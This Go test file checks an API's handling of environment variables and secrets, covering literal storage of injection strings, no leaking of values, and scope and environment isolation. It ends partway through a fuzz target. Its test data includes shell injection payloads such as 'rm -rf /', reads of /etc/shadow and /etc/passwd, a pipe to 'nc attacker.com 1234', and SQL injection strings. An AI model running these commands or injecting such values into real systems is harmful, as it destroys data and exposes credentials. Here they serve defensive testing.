package api

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"slices"
	"strings"
	"testing"
	"time"

	"strait/internal/domain"
)

// TestEnvironment_VariableKeyInjection verifies that shell metacharacters in
// environment variable keys are stored literally and do not cause errors.
func TestEnvironment_VariableKeyInjection(t *testing.T) {
	t.Parallel()

	maliciousKeys := []string{
		"$(whoami)",
		"`rm -rf /`",
		"KEY;DROP TABLE envs;--",
		"FOO&&echo hacked",
		"BAR|cat /etc/passwd",
		"${PATH}",
		"KEY\nVALUE=evil",
	}

	for i, key := range maliciousKeys {
		t.Run(fmt.Sprintf("key_%d", i), func(t *testing.T) {
			t.Parallel()
			var captured *domain.Environment
			ms := &APIStoreMock{
				CreateEnvironmentFunc: func(_ context.Context, env *domain.Environment) error {
					captured = env
					env.ID = fmt.Sprintf("env-%d", i)
					env.CreatedAt = time.Now()
					env.UpdatedAt = time.Now()
					return nil
				},
			}
			srv := newTestServer(t, ms, &mockQueue{}, nil)

			vars := map[string]string{key: "safe_value"}
			varsJSON, _ := json.Marshal(vars)
			body := fmt.Sprintf(`{"project_id":"proj-1","name":"test-env","slug":"test-%d","variables":%s}`, i, varsJSON)

			w := httptest.NewRecorder()
			srv.ServeHTTP(w, authedRequest(http.MethodPost, "/v1/environments", body))

			if w.Code != http.StatusCreated {
				t.Fatalf("expected 201, got %d: %s", w.Code, w.Body.String())
			}
			if captured == nil {
				t.Fatal("expected environment to be captured")
			}
			if captured.Variables[key] != "safe_value" {
				t.Fatalf("expected variable key to be stored literally, got %v", captured.Variables)
			}
		})
	}
}

// TestEnvironment_VariableValueInjection verifies that shell metacharacters in
// environment variable values are stored literally.
func TestEnvironment_VariableValueInjection(t *testing.T) {
	t.Parallel()

	maliciousValues := []string{
		"$(cat /etc/shadow)",
		"`id`",
		"value;rm -rf /",
		"val&&echo hacked",
		"val|nc attacker.com 1234",
		"val\x00hidden",
	}

	for i, val := range maliciousValues {
		t.Run(fmt.Sprintf("value_%d", i), func(t *testing.T) {
			t.Parallel()
			var captured *domain.Environment
			ms := &APIStoreMock{
				CreateEnvironmentFunc: func(_ context.Context, env *domain.Environment) error {
					captured = env
					env.ID = fmt.Sprintf("env-v-%d", i)
					env.CreatedAt = time.Now()
					env.UpdatedAt = time.Now()
					return nil
				},
			}
			srv := newTestServer(t, ms, &mockQueue{}, nil)

			vars := map[string]string{"SAFE_KEY": val}
			varsJSON, _ := json.Marshal(vars)
			body := fmt.Sprintf(`{"project_id":"proj-1","name":"val-env","slug":"val-%d","variables":%s}`, i, varsJSON)

			w := httptest.NewRecorder()
			srv.ServeHTTP(w, authedRequest(http.MethodPost, "/v1/environments", body))

			if w.Code != http.StatusCreated {
				t.Fatalf("expected 201, got %d: %s", w.Code, w.Body.String())
			}
			if captured == nil {
				t.Fatal("expected environment to be captured")
			}
			want := strings.ReplaceAll(val, "\x00", "")
			if captured.Variables["SAFE_KEY"] != want {
				t.Fatalf("expected variable value %q, got %q", want, captured.Variables["SAFE_KEY"])
			}
		})
	}
}

// TestEnvironment_CircularParentID verifies that setting an environment's parent
// to itself does not cause infinite loops. The store layer is responsible for
// preventing this; we verify the API layer does not panic.
func TestEnvironment_CircularParentID(t *testing.T) {
	t.Parallel()

	ms := &APIStoreMock{
		GetEnvironmentFunc: func(_ context.Context, id string, _ string) (*domain.Environment, error) {
			return &domain.Environment{
				ID: id, ProjectID: "proj-1", Name: "circular", Slug: "circular",
				ParentID:  id,
				CreatedAt: time.Now(), UpdatedAt: time.Now(),
			}, nil
		},
		UpdateEnvironmentFunc: func(_ context.Context, _ *domain.Environment) error {
			return nil
		},
	}
	srv := newTestServer(t, ms, &mockQueue{}, nil)

	body := `{"parent_id":"env-circular"}`
	w := httptest.NewRecorder()
	srv.ServeHTTP(w, authedRequest(http.MethodPatch, "/v1/environments/env-circular", body))

	// Should not panic or hang. Any response code is acceptable.
	if w.Code == 0 {
		t.Fatal("expected a response")
	}
}

// TestEnvironment_DeepParentChain verifies that a 100-level deep parent chain
// in variable resolution does not cause stack overflow.
func TestEnvironment_DeepParentChain(t *testing.T) {
	t.Parallel()

	ms := &APIStoreMock{
		GetEnvironmentFunc: func(_ context.Context, id string, _ string) (*domain.Environment, error) {
			return &domain.Environment{
				ID: id, ProjectID: "proj-1", Name: "env-" + id, Slug: "env-" + id,
				Variables: map[string]string{"KEY": id},
				CreatedAt: time.Now(), UpdatedAt: time.Now(),
			}, nil
		},
		GetResolvedEnvironmentVariablesFunc: func(_ context.Context, id string) (map[string]string, error) {
			return map[string]string{"KEY": id, "ROOT": "env-99"}, nil
		},
	}
	srv := newTestServer(t, ms, &mockQueue{}, nil)

	w := httptest.NewRecorder()
	srv.ServeHTTP(w, authedRequest(http.MethodGet, "/v1/environments/env-0", ""))

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
}

// TestEnvironment_VariableOverrideResolution verifies that child environment
// variables override parent variables in resolution.
func TestEnvironment_VariableOverrideResolution(t *testing.T) {
	t.Parallel()

	ms := &APIStoreMock{
		GetEnvironmentFunc: func(_ context.Context, id string, _ string) (*domain.Environment, error) {
			return &domain.Environment{
				ID: id, ProjectID: "proj-1", Name: "child", Slug: "child",
				ParentID:  "env-parent",
				Variables: map[string]string{"DB_HOST": "child-db.example.com"},
				CreatedAt: time.Now(), UpdatedAt: time.Now(),
			}, nil
		},
		GetResolvedEnvironmentVariablesFunc: func(_ context.Context, _ string) (map[string]string, error) {
			return map[string]string{
				"DB_HOST": "child-db.example.com",
				"API_KEY": "inherited-from-parent",
			}, nil
		},
	}
	srv := newTestServer(t, ms, &mockQueue{}, nil)

	w := httptest.NewRecorder()
	srv.ServeHTTP(w, authedRequest(http.MethodGet, "/v1/environments/env-child", ""))

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp EnvironmentResponse
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("invalid JSON: %v", err)
	}
	if strings.Contains(w.Body.String(), "child-db.example.com") || strings.Contains(w.Body.String(), "inherited-from-parent") {
		t.Fatalf("environment metadata response leaked resolved variable values: %s", w.Body.String())
	}
	if !containsString(resp.ResolvedVariableKeys, "DB_HOST") || !containsString(resp.ResolvedVariableKeys, "API_KEY") {
		t.Fatalf("expected resolved variable keys, got %v", resp.ResolvedVariableKeys)
	}
}

func TestEnvironment_MetadataResponsesDoNotLeakVariableValues(t *testing.T) {
	t.Parallel()

	ms := &APIStoreMock{
		GetEnvironmentFunc: func(_ context.Context, id string, _ string) (*domain.Environment, error) {
			return &domain.Environment{
				ID:        id,
				ProjectID: "proj-1",
				Name:      "Production",
				Slug:      "production",
				Variables: map[string]string{"API_TOKEN": "secret-token-value"},
				CreatedAt: time.Now(),
				UpdatedAt: time.Now(),
			}, nil
		},
		GetResolvedEnvironmentVariablesFunc: func(_ context.Context, _ string) (map[string]string, error) {
			return map[string]string{"API_TOKEN": "secret-token-value", "DATABASE_URL": "postgres://user:pass@example/db"}, nil
		},
	}
	srv := newTestServer(t, ms, &mockQueue{}, nil)

	w := httptest.NewRecorder()
	srv.ServeHTTP(w, authedRequest(http.MethodGet, "/v1/environments/env-prod", ""))

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	if strings.Contains(w.Body.String(), "secret-token-value") || strings.Contains(w.Body.String(), "postgres://user:pass") {
		t.Fatalf("environment metadata response leaked variable value: %s", w.Body.String())
	}
	if !strings.Contains(w.Body.String(), "API_TOKEN") || !strings.Contains(w.Body.String(), "DATABASE_URL") {
		t.Fatalf("environment metadata response should include variable keys: %s", w.Body.String())
	}
}

func TestEnvironment_ListDoesNotLeakVariableValues(t *testing.T) {
	t.Parallel()

	ms := &APIStoreMock{
		ListEnvironmentsFunc: func(_ context.Context, projectID string, _ int, _ *time.Time) ([]domain.Environment, error) {
			return []domain.Environment{{
				ID:        "env-prod",
				ProjectID: projectID,
				Name:      "Production",
				Slug:      "production",
				Variables: map[string]string{"API_TOKEN": "secret-token-value"},
				CreatedAt: time.Now(),
				UpdatedAt: time.Now(),
			}}, nil
		},
	}
	srv := newTestServer(t, ms, &mockQueue{}, nil)

	w := httptest.NewRecorder()
	srv.ServeHTTP(w, authedRequest(http.MethodGet, "/v1/environments", ""))

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	if strings.Contains(w.Body.String(), "secret-token-value") {
		t.Fatalf("environment list leaked variable value: %s", w.Body.String())
	}
	if !strings.Contains(w.Body.String(), "API_TOKEN") {
		t.Fatalf("environment list should include variable key metadata: %s", w.Body.String())
	}
}

func TestEnvironment_EnvironmentScopedCallerCannotCreateEnvironment(t *testing.T) {
	t.Parallel()

	ms := &APIStoreMock{
		CreateEnvironmentFunc: func(context.Context, *domain.Environment) error {
			t.Fatal("CreateEnvironment must not be called for environment-scoped credentials")
			return nil
		},
	}
	srv := newTestServer(t, ms, &mockQueue{}, nil)
	ctx := context.WithValue(context.Background(), ctxProjectIDKey, "proj-1")
	ctx = context.WithValue(ctx, ctxEnvironmentIDKey, "env-staging")

	_, err := srv.handleCreateEnvironment(ctx, &CreateEnvironmentInput{Body: CreateEnvironmentRequest{
		ProjectID: "proj-1",
		Name:      "Prod",
		Slug:      "prod",
	}})
	if err == nil {
		t.Fatal("expected environment-scoped create to fail")
	}
}

func TestEnvironment_RejectsParentOutsideProject(t *testing.T) {
	t.Parallel()

	ms := &APIStoreMock{
		GetEnvironmentFunc: func(_ context.Context, id string, _ string) (*domain.Environment, error) {
			return &domain.Environment{ID: id, ProjectID: "proj-other", Name: "Other", Slug: "other"}, nil
		},
		CreateEnvironmentFunc: func(context.Context, *domain.Environment) error {
			t.Fatal("CreateEnvironment must not be called with cross-project parent")
			return nil
		},
	}
	srv := newTestServer(t, ms, &mockQueue{}, nil)
	ctx := context.WithValue(context.Background(), ctxProjectIDKey, "proj-1")

	_, err := srv.handleCreateEnvironment(ctx, &CreateEnvironmentInput{Body: CreateEnvironmentRequest{
		ProjectID: "proj-1",
		Name:      "Child",
		Slug:      "child",
		ParentID:  "env-other",
	}})
	if err == nil {
		t.Fatal("expected cross-project parent to fail")
	}
}

func TestEnvironment_EnvironmentScopedCallerCannotSetOtherParent(t *testing.T) {
	t.Parallel()

	ms := &APIStoreMock{
		GetEnvironmentFunc: func(_ context.Context, id string, _ string) (*domain.Environment, error) {
			if id == "env-staging" {
				return &domain.Environment{ID: id, ProjectID: "proj-1", Name: "Staging", Slug: "staging"}, nil
			}
			return &domain.Environment{ID: id, ProjectID: "proj-1", Name: "Prod", Slug: "prod"}, nil
		},
		UpdateEnvironmentFunc: func(context.Context, *domain.Environment) error {
			t.Fatal("UpdateEnvironment must not be called with cross-environment parent")
			return nil
		},
	}
	srv := newTestServer(t, ms, &mockQueue{}, nil)
	ctx := context.WithValue(context.Background(), ctxProjectIDKey, "proj-1")
	ctx = context.WithValue(ctx, ctxEnvironmentIDKey, "env-staging")
	parentID := "env-prod"

	_, err := srv.handleUpdateEnvironment(ctx, &UpdateEnvironmentInput{
		EnvID: "env-staging",
		Body:  UpdateEnvironmentRequest{ParentID: &parentID},
	})
	if err == nil {
		t.Fatal("expected cross-environment parent update to fail")
	}
}

func TestEnvironment_VariablesRouteRequiresSecretsRead(t *testing.T) {
	t.Parallel()

	ms := &APIStoreMock{
		GetEnvironmentFunc: func(context.Context, string, string) (*domain.Environment, error) {
			t.Fatal("GetEnvironment must not be called without secrets:read")
			return nil, nil
		},
	}
	srv := newTestServer(t, ms, &mockQueue{}, nil)

	w := httptest.NewRecorder()
	req := apiKeyRequestWithScopes(http.MethodGet, "/v1/environments/env-prod/variables", "", "proj-1", []string{domain.ScopeJobsRead})
	srv.ServeHTTP(w, req)

	if w.Code != http.StatusForbidden {
		t.Fatalf("expected 403, got %d: %s", w.Code, w.Body.String())
	}
}

func TestEnvironment_CreateVariablesRequiresSecretsWrite(t *testing.T) {
	t.Parallel()

	ms := &APIStoreMock{
		CreateEnvironmentFunc: func(context.Context, *domain.Environment) error {
			t.Fatal("CreateEnvironment must not be called without secrets:write when variables are present")
			return nil
		},
	}
	srv := newTestServer(t, ms, &mockQueue{}, nil)

	ctx := context.WithValue(context.Background(), ctxProjectIDKey, "proj-1")
	ctx = context.WithValue(ctx, ctxActorTypeKey, "api_key")
	ctx = context.WithValue(ctx, ctxActorIDKey, "apikey:jobs-only")
	ctx = context.WithValue(ctx, ctxScopesKey, []string{domain.ScopeJobsWrite})

	_, err := srv.handleCreateEnvironment(ctx, &CreateEnvironmentInput{Body: CreateEnvironmentRequest{
		ProjectID: "proj-1",
		Name:      "Production",
		Slug:      "production",
		Variables: map[string]string{"DATABASE_URL": "postgres://secret"},
	}})
	if !isHumaStatusError(err, http.StatusForbidden) {
		t.Fatalf("expected 403 for variables without secrets:write, got %v", err)
	}
}

func TestEnvironment_UpdateVariablesRequiresSecretsWrite(t *testing.T) {
	t.Parallel()

	ms := &APIStoreMock{
		GetEnvironmentFunc: func(context.Context, string, string) (*domain.Environment, error) {
			return &domain.Environment{ID: "env-prod", ProjectID: "proj-1", Name: "Production", Slug: "production"}, nil
		},
		UpdateEnvironmentFunc: func(context.Context, *domain.Environment) error {
			t.Fatal("UpdateEnvironment must not be called without secrets:write when variables are present")
			return nil
		},
	}
	srv := newTestServer(t, ms, &mockQueue{}, nil)

	ctx := context.WithValue(context.Background(), ctxProjectIDKey, "proj-1")
	ctx = context.WithValue(ctx, ctxActorTypeKey, "api_key")
	ctx = context.WithValue(ctx, ctxActorIDKey, "apikey:jobs-only")
	ctx = context.WithValue(ctx, ctxScopesKey, []string{domain.ScopeJobsWrite})
	vars := map[string]string{"API_TOKEN": "secret-token"}

	_, err := srv.handleUpdateEnvironment(ctx, &UpdateEnvironmentInput{
		EnvID: "env-prod",
		Body:  UpdateEnvironmentRequest{Variables: &vars},
	})
	if !isHumaStatusError(err, http.StatusForbidden) {
		t.Fatalf("expected 403 for variable update without secrets:write, got %v", err)
	}
}

func TestEnvironment_UpdateVariablesAllowsSecretsWrite(t *testing.T) {
	t.Parallel()

	updated := false
	ms := &APIStoreMock{
		GetEnvironmentFunc: func(context.Context, string, string) (*domain.Environment, error) {
			return &domain.Environment{ID: "env-prod", ProjectID: "proj-1", Name: "Production", Slug: "production"}, nil
		},
		UpdateEnvironmentFunc: func(_ context.Context, env *domain.Environment) error {
			updated = true
			if env.Variables["API_TOKEN"] != "secret-token" {
				t.Fatalf("variable update was not propagated: %#v", env.Variables)
			}
			return nil
		},
	}
	srv := newTestServer(t, ms, &mockQueue{}, nil)

	ctx := context.WithValue(context.Background(), ctxProjectIDKey, "proj-1")
	ctx = context.WithValue(ctx, ctxActorTypeKey, "api_key")
	ctx = context.WithValue(ctx, ctxActorIDKey, "apikey:secrets")
	ctx = context.WithValue(ctx, ctxScopesKey, []string{domain.ScopeJobsWrite, domain.ScopeSecretsWrite})
	vars := map[string]string{"API_TOKEN": "secret-token"}

	_, err := srv.handleUpdateEnvironment(ctx, &UpdateEnvironmentInput{
		EnvID: "env-prod",
		Body:  UpdateEnvironmentRequest{Variables: &vars},
	})
	if err != nil {
		t.Fatalf("expected secrets:write variable update to pass, got %v", err)
	}
	if !updated {
		t.Fatal("expected UpdateEnvironment to be called")
	}
}

// TestEnvironment_NullBytesInVariables verifies that null bytes in variable
// keys and values do not cause panics or corruption.
func TestEnvironment_NullBytesInVariables(t *testing.T) {
	t.Parallel()

	var captured *domain.Environment
	ms := &APIStoreMock{
		CreateEnvironmentFunc: func(_ context.Context, env *domain.Environment) error {
			captured = env
			env.ID = "env-null"
			env.CreatedAt = time.Now()
			env.UpdatedAt = time.Now()
			return nil
		},
	}
	srv := newTestServer(t, ms, &mockQueue{}, nil)

	body := `{"project_id":"proj-1","name":"null-env","slug":"null-env","variables":{"KEY\u0000X":"VAL\u0000Y"}}`
	w := httptest.NewRecorder()
	srv.ServeHTTP(w, authedRequest(http.MethodPost, "/v1/environments", body))

	if w.Code != http.StatusCreated {
		t.Fatalf("expected 201, got %d: %s", w.Code, w.Body.String())
	}
	if captured == nil {
		t.Fatal("expected environment to be captured")
	}
	found := false
	for k := range captured.Variables {
		if strings.Contains(k, "\x00") {
			found = true
			break
		}
	}
	if !found {
		t.Log("null byte in key may have been stripped or escaped by JSON decoder")
	}
}

// TestEnvironment_EmptyVariableName verifies that an empty string variable key
// does not cause errors.
func TestEnvironment_EmptyVariableName(t *testing.T) {
	t.Parallel()

	ms := &APIStoreMock{
		CreateEnvironmentFunc: func(_ context.Context, env *domain.Environment) error {
			env.ID = "env-empty-key"
			env.CreatedAt = time.Now()
			env.UpdatedAt = time.Now()
			return nil
		},
	}
	srv := newTestServer(t, ms, &mockQueue{}, nil)

	body := `{"project_id":"proj-1","name":"empty-key-env","slug":"empty-key","variables":{"":"some_value"}}`
	w := httptest.NewRecorder()
	srv.ServeHTTP(w, authedRequest(http.MethodPost, "/v1/environments", body))

	if w.Code == http.StatusInternalServerError {
		t.Fatalf("empty variable name should not cause 500: %s", w.Body.String())
	}
}

// TestEnvironment_DuplicateVariableKeys verifies that sending duplicate keys
// in the variables map is handled (JSON spec says last value wins).
func TestEnvironment_DuplicateVariableKeys(t *testing.T) {
	t.Parallel()

	var captured *domain.Environment
	ms := &APIStoreMock{
		CreateEnvironmentFunc: func(_ context.Context, env *domain.Environment) error {
			captured = env
			env.ID = "env-dup"
			env.CreatedAt = time.Now()
			env.UpdatedAt = time.Now()
			return nil
		},
	}
	srv := newTestServer(t, ms, &mockQueue{}, nil)

	body := `{"project_id":"proj-1","name":"dup-env","slug":"dup-env","variables":{"DB_HOST":"first","DB_HOST":"second"}}`
	w := httptest.NewRecorder()
	srv.ServeHTTP(w, authedRequest(http.MethodPost, "/v1/environments", body))

	if w.Code != http.StatusCreated {
		t.Fatalf("expected 201, got %d: %s", w.Code, w.Body.String())
	}
	if captured == nil {
		t.Fatal("expected environment to be captured")
	}
	if captured.Variables["DB_HOST"] != "second" {
		t.Fatalf("expected last value 'second' for duplicate key, got %q", captured.Variables["DB_HOST"])
	}
}

// TestSecret_CreateWithSQLInjectionKey verifies that SQL injection attempts
// in secret_key are stored literally and do not cause SQL errors.
func TestSecret_CreateWithSQLInjectionKey(t *testing.T) {
	t.Parallel()

	injectionKeys := []string{
		"'; DROP TABLE secrets; --",
		"key' OR '1'='1",
		"key\"; DELETE FROM secrets; --",
		"key$(rm -rf /)",
	}

	for i, key := range injectionKeys {
		t.Run(fmt.Sprintf("sql_injection_%d", i), func(t *testing.T) {
			t.Parallel()
			var captured *domain.JobSecret
			ms := &APIStoreMock{
				CreateJobSecretFunc: func(_ context.Context, secret *domain.JobSecret) error {
					captured = secret
					secret.ID = fmt.Sprintf("sec-%d", i)
					secret.CreatedAt = time.Now()
					secret.UpdatedAt = time.Now()
					return nil
				},
			}
			srv := newTestServerWithEncryption(t, ms, &mockQueue{})

			reqBody := map[string]string{
				"project_id": "proj-1",
				"secret_key": key,
				"value":      "safe_value",
			}
			bodyJSON, _ := json.Marshal(reqBody)

			w := httptest.NewRecorder()
			srv.ServeHTTP(w, authedRequest(http.MethodPost, "/v1/secrets", string(bodyJSON)))

			if w.Code != http.StatusCreated {
				t.Fatalf("expected 201, got %d: %s", w.Code, w.Body.String())
			}
			if captured == nil {
				t.Fatal("expected secret to be captured")
			}
			if captured.SecretKey != key {
				t.Fatalf("expected secret_key to be stored literally as %q, got %q", key, captured.SecretKey)
			}
		})
	}
}

// TestSecret_EncryptionVerification verifies that the secret value stored
// in the database goes through the store layer (EncryptedValue field).
func TestSecret_EncryptionVerification(t *testing.T) {
	t.Parallel()

	var captured *domain.JobSecret
	ms := &APIStoreMock{
		CreateJobSecretFunc: func(_ context.Context, secret *domain.JobSecret) error {
			captured = secret
			secret.ID = "sec-enc"
			secret.CreatedAt = time.Now()
			secret.UpdatedAt = time.Now()
			return nil
		},
	}
	srv := newTestServerWithEncryption(t, ms, &mockQueue{})

	body := `{"project_id":"proj-1","secret_key":"DB_PASSWORD","value":"super-secret-123"}`
	w := httptest.NewRecorder()
	srv.ServeHTTP(w, authedRequest(http.MethodPost, "/v1/secrets", body))

	if w.Code != http.StatusCreated {
		t.Fatalf("expected 201, got %d: %s", w.Code, w.Body.String())
	}
	if captured == nil {
		t.Fatal("expected secret to be captured")
	}
	if captured.EncryptedValue == "" {
		t.Fatal("expected EncryptedValue to be populated")
	}
}

// TestSecret_DecryptionRoundTrip verifies that creating and listing secrets
// returns the expected metadata (value is not returned in list responses).
func TestSecret_DecryptionRoundTrip(t *testing.T) {
	t.Parallel()

	createdSecret := &domain.JobSecret{
		ID: "sec-rt", ProjectID: "proj-1", SecretKey: "API_TOKEN",
		Environment: "production", KeyVersion: 1,
		CreatedAt: time.Now(), UpdatedAt: time.Now(),
	}

	ms := &APIStoreMock{
		CreateJobSecretFunc: func(_ context.Context, secret *domain.JobSecret) error {
			secret.ID = createdSecret.ID
			secret.CreatedAt = createdSecret.CreatedAt
			secret.UpdatedAt = createdSecret.UpdatedAt
			return nil
		},
		ListJobSecretsFunc: func(_ context.Context, _, _, _ string, _ int, _ *time.Time) ([]domain.JobSecret, error) {
			return []domain.JobSecret{*createdSecret}, nil
		},
	}
	srv := newTestServerWithEncryption(t, ms, &mockQueue{})

	body := `{"project_id":"proj-1","secret_key":"API_TOKEN","value":"token-value"}`
	w := httptest.NewRecorder()
	srv.ServeHTTP(w, authedRequest(http.MethodPost, "/v1/secrets", body))
	if w.Code != http.StatusCreated {
		t.Fatalf("create: expected 201, got %d: %s", w.Code, w.Body.String())
	}

	w2 := httptest.NewRecorder()
	srv.ServeHTTP(w2, authedProjectRequest(http.MethodGet, "/v1/secrets", "", "proj-1"))
	if w2.Code != http.StatusOK {
		t.Fatalf("list: expected 200, got %d: %s", w2.Code, w2.Body.String())
	}

	if strings.Contains(w2.Body.String(), "token-value") {
		t.Fatal("encrypted value should not appear in list response")
	}
}

// TestSecret_CrossEnvironmentIsolation verifies that secrets created for one
// environment are not returned when listing for a different environment.
func TestSecret_CrossEnvironmentIsolation(t *testing.T) {
	t.Parallel()

	ms := &APIStoreMock{
		ListJobSecretsFunc: func(_ context.Context, _, _, env string, _ int, _ *time.Time) ([]domain.JobSecret, error) {
			if env == "production" {
				return []domain.JobSecret{
					{ID: "sec-prod", ProjectID: "proj-1", SecretKey: "PROD_KEY", Environment: "production"},
				}, nil
			}
			return []domain.JobSecret{}, nil
		},
	}
	srv := newTestServer(t, ms, &mockQueue{}, nil)

	w := httptest.NewRecorder()
	req := authedProjectRequest(http.MethodGet, "/v1/secrets?environment=staging", "", "proj-1")
	srv.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	if strings.Contains(w.Body.String(), "PROD_KEY") {
		t.Fatal("production secret should not appear in staging listing")
	}
}

func TestSecret_EnvironmentScopedCallerCannotCreateSecretInOtherEnvironment(t *testing.T) {
	t.Parallel()

	ms := &APIStoreMock{
		ListEnvironmentsFunc: func(_ context.Context, projectID string, _ int, _ *time.Time) ([]domain.Environment, error) {
			return []domain.Environment{
				{ID: "env-staging", ProjectID: projectID, Slug: "staging", Name: "Staging"},
				{ID: "env-prod", ProjectID: projectID, Slug: "production", Name: "Production"},
			}, nil
		},
		CreateJobSecretFunc: func(context.Context, *domain.JobSecret) error {
			t.Fatal("CreateJobSecret must not be called for cross-environment create")
			return nil
		},
	}
	srv := newTestServerWithEncryption(t, ms, &mockQueue{})
	ctx := context.WithValue(context.Background(), ctxProjectIDKey, "proj-1")
	ctx = context.WithValue(ctx, ctxEnvironmentIDKey, "env-staging")

	_, err := srv.handleCreateSecret(ctx, &CreateSecretInput{Body: createSecretRequest{
		ProjectID:   "proj-1",
		Environment: "production",
		SecretKey:   "PROD_TOKEN",
		Value:       "secret",
	}})
	if err == nil {
		t.Fatal("expected cross-environment secret create to fail")
	}
}

func TestSecret_JobSecretMustMatchJobEnvironment(t *testing.T) {
	t.Parallel()

	ms := &APIStoreMock{
		ListEnvironmentsFunc: func(_ context.Context, projectID string, _ int, _ *time.Time) ([]domain.Environment, error) {
			return []domain.Environment{
				{ID: "env-staging", ProjectID: projectID, Slug: "staging", Name: "Staging"},
				{ID: "env-prod", ProjectID: projectID, Slug: "production", Name: "Production"},
			}, nil
		},
		GetJobFunc: func(_ context.Context, jobID string) (*domain.Job, error) {
			return &domain.Job{ID: jobID, ProjectID: "proj-1", EnvironmentID: "env-staging"}, nil
		},
		CreateJobSecretFunc: func(context.Context, *domain.JobSecret) error {
			t.Fatal("CreateJobSecret must not be called for job/environment mismatch")
			return nil
		},
	}
	srv := newTestServerWithEncryption(t, ms, &mockQueue{})
	ctx := context.WithValue(context.Background(), ctxProjectIDKey, "proj-1")

	_, err := srv.handleCreateSecret(ctx, &CreateSecretInput{Body: createSecretRequest{
		ProjectID:   "proj-1",
		JobID:       "job-staging",
		Environment: "production",
		SecretKey:   "API_TOKEN",
		Value:       "secret",
	}})
	if err == nil {
		t.Fatal("expected job/environment mismatch to fail")
	}
}

func TestSecret_EnvironmentScopedListDefaultsToCallerEnvironment(t *testing.T) {
	t.Parallel()

	ms := &APIStoreMock{
		ListJobSecretsFunc: func(_ context.Context, projectID, jobID, env string, _ int, _ *time.Time) ([]domain.JobSecret, error) {
			if projectID != "proj-1" || jobID != "" || env != "env-staging" {
				t.Fatalf("ListJobSecrets args = project %q job %q env %q, want proj-1/empty/env-staging", projectID, jobID, env)
			}
			return []domain.JobSecret{{ID: "sec-staging", ProjectID: "proj-1", Environment: "env-staging", SecretKey: "STAGING_TOKEN"}}, nil
		},
	}
	srv := newTestServerWithEncryption(t, ms, &mockQueue{})
	ctx := context.WithValue(context.Background(), ctxProjectIDKey, "proj-1")
	ctx = context.WithValue(ctx, ctxEnvironmentIDKey, "env-staging")

	out, err := srv.handleListSecrets(ctx, &ListSecretsInput{})
	if err != nil {
		t.Fatalf("handleListSecrets() error = %v", err)
	}
	items, ok := out.Body.Data.([]domain.JobSecret)
	if !ok {
		t.Fatalf("response data type = %T, want []domain.JobSecret", out.Body.Data)
	}
	if len(items) != 1 {
		t.Fatalf("len(items) = %d, want 1", len(items))
	}
}

func TestSecret_EnvironmentScopedCallerCannotReadOrDeleteOtherEnvironmentSecret(t *testing.T) {
	t.Parallel()

	ms := &APIStoreMock{
		GetJobSecretFunc: func(context.Context, string, string) (*domain.JobSecret, error) {
			return &domain.JobSecret{ID: "sec-prod", ProjectID: "proj-1", Environment: "env-prod", SecretKey: "PROD_TOKEN"}, nil
		},
		DeleteJobSecretFunc: func(context.Context, string, string) error {
			t.Fatal("DeleteJobSecret must not be called for cross-environment secret")
			return nil
		},
	}
	srv := newTestServerWithEncryption(t, ms, &mockQueue{})
	ctx := context.WithValue(context.Background(), ctxProjectIDKey, "proj-1")
	ctx = context.WithValue(ctx, ctxEnvironmentIDKey, "env-staging")

	if _, err := srv.handleGetSecret(ctx, &GetSecretInput{SecretID: "sec-prod"}); err == nil {
		t.Fatal("expected cross-environment secret read to fail")
	}
	if _, err := srv.handleDeleteSecret(ctx, &DeleteSecretInput{SecretID: "sec-prod"}); err == nil {
		t.Fatal("expected cross-environment secret delete to fail")
	}
}

// TestSecret_KeyVersionTracking verifies that the key version is tracked
// when a secret is created.
func TestSecret_KeyVersionTracking(t *testing.T) {
	t.Parallel()

	var captured *domain.JobSecret
	ms := &APIStoreMock{
		CreateJobSecretFunc: func(_ context.Context, secret *domain.JobSecret) error {
			captured = secret
			secret.ID = "sec-kv"
			secret.CreatedAt = time.Now()
			secret.UpdatedAt = time.Now()
			return nil
		},
	}
	srv := newTestServerWithEncryption(t, ms, &mockQueue{})

	body := `{"project_id":"proj-1","secret_key":"VERSIONED_KEY","value":"v1-value"}`
	w := httptest.NewRecorder()
	srv.ServeHTTP(w, authedRequest(http.MethodPost, "/v1/secrets", body))

	if w.Code != http.StatusCreated {
		t.Fatalf("expected 201, got %d: %s", w.Code, w.Body.String())
	}
	if captured == nil {
		t.Fatal("expected secret to be captured")
	}
	if captured.KeyVersion < 0 {
		t.Fatalf("expected non-negative key version, got %d", captured.KeyVersion)
	}
}

// FuzzEnvironmentVariables fuzzes environment variable key/value pairs to ensure
// the create handler does not panic on arbitrary input.
func FuzzEnvironmentVariables(f *testing.F) {
	f.Add("NORMAL_KEY", "normal_value")
	f.Add("", "empty_key")
	f.Add("KEY", "")
	f.Add("$(whoami)", "injected")
	f.Add("KEY\x00NULL", "VAL\x00NULL")
	f.Add(strings.Repeat("A", 10000), "long_key")

	f.Fuzz(func(t *testing.T, key, value string) {
		ms := &APIStoreMock{
			CreateEnvironmentFunc: func(_ context.Context, env *domain.Environment) error {
				env.ID = "env-fuzz"
				env.CreatedAt = time.Now()
				env.UpdatedAt = time.Now()
				return nil
			},
		}
		srv := newTestServer(t, ms, &mockQueue{}, nil)

		vars := map[string]string{key: value}
		varsJSON, err := json.Marshal(vars)
		if err != nil {
			return
		}
		body := fmt.Sprintf(`{"project_id":"proj-1","name":"fuzz","slug":"fuzz","variables":%s}`, varsJSON)

		w := httptest.NewRecorder()
		srv.ServeHTTP(w, authedRequest(http.MethodPost, "/v1/environments", body))
		_ = w.Code
	})
}

// FuzzSecretKey fuzzes secret key names to ensure the create handler does not
// panic on arbitrary input.
func FuzzSecretKey(f *testing.F) {
	f.Add("DB_PASSWORD")
	f.Add("")
	f.Add("'; DROP TABLE secrets; --")
	f.Add(strings.Repeat("X", 10000))
	f.Add("KEY\x00NULL")

	f.Fuzz(func(t *testing.T, key string) {
		ms := &APIStoreMock{
